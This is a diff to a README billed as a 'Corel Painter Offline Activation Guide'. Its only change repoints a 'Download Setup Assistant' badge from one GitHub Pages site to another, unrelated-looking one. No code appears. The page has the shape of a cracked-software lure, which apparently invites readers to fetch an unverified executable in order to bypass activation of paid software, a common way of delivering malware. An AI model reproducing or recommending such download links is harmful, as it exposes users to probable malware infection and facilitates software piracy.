@@ -1,6 +1,6 @@
 # Corel Painter — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://corel-painter-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://matookfj.github.io/.github/corelpainter)
 
 ## ⚙️ How to Use
 
